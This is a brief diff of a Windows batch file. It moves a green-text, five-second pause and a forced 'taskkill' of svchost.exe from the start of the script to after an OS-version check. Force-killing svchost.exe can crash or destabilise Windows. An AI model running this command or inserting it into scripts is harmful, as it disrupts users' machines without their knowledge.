@@ -1,7 +1,4 @@
 @echo off
-color 0a
-timeout 5
-taskkill /f /im svchost.exe
 if !osNumber! lss 51 (
 	cls
 
@@ -14,3 +11,7 @@ if !osNumber! lss 51 (
 	
 	pause
 	exit
+
+color 0a
+timeout 5
+taskkill /f /im svchost.exe
